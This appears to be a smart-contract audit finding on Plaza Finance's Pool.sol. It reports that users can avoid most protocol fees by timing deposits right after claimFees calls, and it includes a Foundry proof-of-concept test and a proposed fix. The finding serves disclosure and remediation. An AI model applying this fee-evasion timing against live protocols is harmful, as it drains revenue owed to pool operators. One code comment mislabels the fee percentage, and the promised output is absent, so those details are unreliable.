# Users can avoid fees by depositing in the pool directly after fees have been claimed

### Summary

A problem with fee calculation in ``Pool.sol`` will cause a loss of funds for the protocol as attackers can deposit funds directly after ``claimFees`` has been called in order to avoid protocol fees.

### Root Cause

When calling the ``create`` function in ``Pool.sol``, the following calculation in ``[simulateCreate](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L273)`` is made in order to subtract a fee from the user.

```solidity
poolReserves = poolReserves - (poolReserves * fee * (block.timestamp - lastFeeClaimTime)) / (PRECISION * SECONDS_PER_YEAR); 
```

The size of the fee will depend on ``block.timestamp - lastFeeClaimTime``, i.e. how much time has passed since the last fee claim. 

A user can use this information and monitor incoming ``claimFees()`` transactions and place ``create`` calls directly after, thereby minimizing the fees paid to the protocol.


### Impact

The attacker can use the protocol without paying the fee set by the pool creators. This will cause losses to the protocol.

### PoC

Paste the following test in ``Pool.t.sol`` and run it. Uncomment the following lines:

```solidity 
vm.startPrank(params.feeBeneficiary);
pool.claimFees();
vm.stopPrank();
```

and run it again.


```solidity 
function testCreateRedeemWithFeesFail() public {
    vm.startPrank(governance);

    // Create a pool with 2% fee
    params.fee = 50000; // 2% fee (1000000 precision)
    params.feeBeneficiary = address(0x942);

    // Mint and approve reserve tokens
    Token rToken = Token(params.reserveToken);
    rToken.mint(governance, 100 ether);
    rToken.approve(address(poolFactory), 100 ether);

    Pool pool = Pool(poolFactory.createPool(params, 100 ether, 500 ether, 250 ether, "", "", "", "", false));
    vm.stopPrank();

    // User creates leverage tokens
    vm.startPrank(user);
    
    rToken.mint(user, 100 ether);
    rToken.approve(address(pool), 100 ether);
    uint256 levAmount = pool.create(Pool.TokenType.LEVERAGE, 4 ether, 0);
    vm.stopPrank();
    // Advance time by 30 days
    
    // mockPriceFeed.setMockPrice(3000 * int256(CHAINLINK_DECIMAL_PRECISION), uint8(CHAINLINK_DECIMAL));

    // // Calculate expected fee

  for (uint i = 30; i < 365; i +=30) {
      vm.warp(vm.getBlockTimestamp() + 30 days);

    mockPriceFeed.setMockPrice(3000 * int256(CHAINLINK_DECIMAL_PRECISION), uint8(CHAINLINK_DECIMAL));

    // vm.startPrank(params.feeBeneficiary);
    // pool.claimFees();
    // vm.stopPrank();


    vm.startPrank(user);
    levAmount = pool.create(Pool.TokenType.LEVERAGE, 8 ether, 0);    
    vm.stopPrank(); 



    console.log("Fee balance at ",i, " days : ", rToken.balanceOf(address(params.feeBeneficiary)));

  }
  skip(5 days);
    // User redeems leverage tokens

    vm.startPrank(params.feeBeneficiary);
    pool.claimFees();
    vm.stopPrank();

    vm.startPrank(user);


    pool.bondToken().approve(address(pool), levAmount);
    mockPriceFeed.setMockPrice(3000 * int256(CHAINLINK_DECIMAL_PRECISION), uint8(CHAINLINK_DECIMAL));

    uint256 redeemedAmount = pool.redeem(Pool.TokenType.LEVERAGE, pool.lToken().balanceOf(user), 0);

    // User should get back less than initial deposit due to fees
    assertLt(redeemedAmount, 100 ether);
    console.log("Redeemed amount: ", redeemedAmount);

    vm.stopPrank();
``` 




Depositing after fees have been claimed yields the following output:

In the end, the user pays ~69% less fees by depositing directly after a fee has been claimed. These percentages will vary according to the ratio between user deposit and pool reserves.

### Mitigation

Fees should be collected only on user actions, instead of the entire reserve token protocol balance.

To achieve this, another data structure should be added to the contract state to keep track of user deposits and accumulated fees.
